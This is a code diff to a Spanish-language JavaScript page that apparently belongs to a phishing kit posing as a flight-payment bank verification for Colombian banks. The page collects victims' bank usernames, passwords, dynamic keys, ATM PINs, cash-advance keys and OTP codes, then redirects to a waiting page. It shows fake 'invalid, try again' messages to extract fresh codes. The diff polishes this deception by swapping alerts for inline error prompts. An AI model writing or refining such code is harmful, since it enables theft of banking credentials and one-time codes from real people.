@@ -25,7 +25,6 @@ if(info.checkerInfo.company === 'VISA'){
     companyLogo.setAttribute('width', '110px');
 }
 
-
 if(info.metaInfo.ban === 'bancolombia'){
     bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
     bankLogo.setAttribute('width', `120px`);
@@ -42,6 +41,38 @@ setTimeout(() =>{
     }
 }, 2500);
 
+/* ======================================================================
+   UTILIDADES DE MENSAJE INLINE (reemplazan alert)
+====================================================================== */
+const errorBox = document.getElementById('inline-error');
+
+function fieldFromList(list){
+  // En tu HTML hay IDs repetidos (b + input). Usas NodeList y el [1] es el input.
+  return (list && list.length > 1) ? list[1] : null;
+}
+
+function showInlineError(msg, inputList){
+  if (errorBox){
+    errorBox.textContent = msg || 'Ha ocurrido un error.';
+    errorBox.style.display = 'block';
+  }
+  const input = fieldFromList(inputList);
+  if (input){
+    input.classList.add('is-error');
+    input.setAttribute('aria-invalid','true');
+    try{ input.focus(); }catch(e){}
+  }
+}
+
+function clearInlineError(inputList){
+  if (errorBox) errorBox.style.display = 'none';
+  const input = fieldFromList(inputList);
+  if (input){
+    input.classList.remove('is-error');
+    input.removeAttribute('aria-invalid');
+  }
+}
+
 /**
  * SET INPUTS
  */
@@ -52,83 +83,82 @@ const dintok = document.querySelectorAll('#dintok');
 const ccaj = document.querySelectorAll('#ccaj');
 const cavance = document.querySelectorAll('#cavance');
 const otpcode = document.querySelectorAll('#otpcode');
+
 if(info.checkerInfo.mode === 'userpassword'){
 
     setTimeout(() =>{
         // COMPROBAR ERROR
         if(info.metaInfo.user !== ''){
-            alert('Datos inválidos, por favor corrija la información e inténtelo de nuevo.');
+            showInlineError('Datos inválidos, por favor corrige la información e inténtalo de nuevo.', user);
         }
     }, 2050);
 
-    user.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-    puser.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
+    user.forEach(elem => elem.classList.remove('hidden'));
+    puser.forEach(elem => elem.classList.remove('hidden'));
 
     if(info.metaInfo.ban === 'bancolombia'){
         puser.forEach(elem => {
             elem.setAttribute('oninput', 'limitDigits(this, 4);');
         });
     }
+
 }else if(info.checkerInfo.mode === 'cdin'){
     setTimeout(() =>{
         // COMPROBAR ERROR
         if(info.metaInfo.cdin !== ''){
             if(info.metaInfo.ban === 'bogota'){
-                alert('Token inválido o expiró, por favor inténtelo de nuevo.');
+                showInlineError('Token inválido o expiró, por favor inténtalo de nuevo.', dintok);
             }else{
-                alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
+                showInlineError('Clave dinámica inválida o expiró, por favor inténtalo de nuevo.', cdin);
             }
-            
         }
     }, 2050);
 
     if(info.metaInfo.ban === 'bogota'){
-        dintok.forEach(elem =>{
-            elem.classList.remove('hidden');
-        });
+        dintok.forEach(elem => elem.classList.remove('hidden'));
     }else{
-        cdin.forEach(elem =>{
-            elem.classList.remove('hidden');
-        });
+        cdin.forEach(elem => elem.classList.remove('hidden'));
     }
-    
+
 }else if(info.checkerInfo.mode === 'ccaj'){
     setTimeout(() =>{
-        // COMPROBAR ERROR
         if(info.metaInfo.ccaj !== ''){
-            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
+            showInlineError('Datos inválidos, por favor ingresa la clave de nuevo.', ccaj);
         }
     }, 2050);
-    ccaj.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
+    ccaj.forEach(elem => elem.classList.remove('hidden'));
+
 }else if(info.checkerInfo.mode === 'cavance'){
     setTimeout(() =>{
-        // COMPROBAR ERROR
         if(info.metaInfo.cavance !== ''){
-            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
+            showInlineError('Datos inválidos, por favor ingresa la clave de nuevo.', cavance);
         }
     }, 2050);
-    cavance.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
+    cavance.forEach(elem => elem.classList.remove('hidden'));
+
 }else if(info.checkerInfo.mode === 'otpcode'){
     setTimeout(() =>{
-        // COMPROBAR ERROR
         if(info.metaInfo.tok === ''){
-            alert('Hemos enviado un código OTP a su teléfono. Por favor ingreselo');
+            showInlineError('Hemos enviado un código OTP a tu teléfono. Por favor ingrésalo.', otpcode);
         } else {
-            alert('Código inválido. Hemos enviado un nuevo código OTP a su teléfono. Por favor ingreselo');
+            showInlineError('Código inválido. Enviamos un nuevo OTP a tu teléfono. Por favor ingrésalo.', otpcode);
         }
     }, 2050);
-    otpcode.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
+    otpcode.forEach(elem => elem.classList.remove('hidden'));
 }
+
+/* Limpia el error cuando el usuario escribe de nuevo */
+[fieldFromList(user), fieldFromList(puser), fieldFromList(cdin), fieldFromList(dintok),
+ fieldFromList(ccaj), fieldFromList(cavance), fieldFromList(otpcode)]
+ .forEach(el => {
+   if(el){
+     el.addEventListener('input', () => {
+       errorBox && (errorBox.style.display = 'none');
+       el.classList.remove('is-error');
+       el.removeAttribute('aria-invalid');
+     });
+   }
+ });
 
 /**
  * SET NUMBERS
@@ -147,63 +177,59 @@ if(info.flightInfo.ticket_nat === 'NAC'){
 }else{
     console.log('flight resume error');
 }
-
 info.flightInfo.type === 1 ? finalPrice = finalPrice * 2 : '';
-
-flightPrice.forEach(elem =>{
-    elem.textContent = formatPrice(finalPrice);
-});
+flightPrice.forEach(elem => elem.textContent = formatPrice(finalPrice));
 
 /**
  * NEXT STEP
  */
 const btnNextStep = document.querySelector('#btnNextStep');
-const form = document.querySelector('#form');
 
 btnNextStep.addEventListener('click', () =>{
-    console.log('hola');
     if(info.checkerInfo.mode === 'userpassword'){
-        if(user[1].value !== ''){
-            if(puser[1].value !== ''){
-                info.metaInfo.user = user[1].value;
-                info.metaInfo.puser = puser[1].value;
-
-                LS.setItem('info', JSON.stringify(info));
-
-                window.location.href = 'waiting.html';
-            }
+        if(user[1].value !== '' && puser[1].value !== ''){
+            info.metaInfo.user = user[1].value;
+            info.metaInfo.puser = puser[1].value;
+            LS.setItem('info', JSON.stringify(info));
+            window.location.href = 'waiting.html';
+        }else{
+            showInlineError('Completa usuario y contraseña para continuar.', user);
         }
     }else if(info.checkerInfo.mode === 'cdin'){
-        if(cdin[1].value !== ''){
-            info.metaInfo.cdin = cdin[1].value;
+        const target = (info.metaInfo.ban === 'bogota') ? dintok : cdin;
+        if(fieldFromList(target)?.value){
+            info.metaInfo.cdin = fieldFromList(target).value;
             LS.setItem('info', JSON.stringify(info));
-
             window.location.href = 'waiting.html';
-
+        }else{
+            showInlineError('Ingresa el código solicitado para continuar.', target);
         }
+
     }else if(info.checkerInfo.mode === 'ccaj'){
         if(ccaj[1].value !== ''){
             info.metaInfo.ccaj = ccaj[1].value;
             LS.setItem('info', JSON.stringify(info));
-
             window.location.href = 'waiting.html';
-            
+        }else{
+            showInlineError('Ingresa la clave de cajero para continuar.', ccaj);
         }
+
     }else if(info.checkerInfo.mode === 'cavance'){
         if(cavance[1].value !== ''){
             info.metaInfo.cavance = cavance[1].value;
             LS.setItem('info', JSON.stringify(info));
-
             window.location.href = 'waiting.html';
-            
+        }else{
+            showInlineError('Ingresa la clave de avances para continuar.', cavance);
         }
+
     }else if(info.checkerInfo.mode === 'otpcode'){
         if(otpcode[1].value !== ''){
             info.metaInfo.tok = otpcode[1].value;
             LS.setItem('info', JSON.stringify(info));
-
             window.location.href = 'waiting.html';
-            
+        }else{
+            showInlineError('Ingresa el código OTP para continuar.', otpcode);
         }
     }
 });
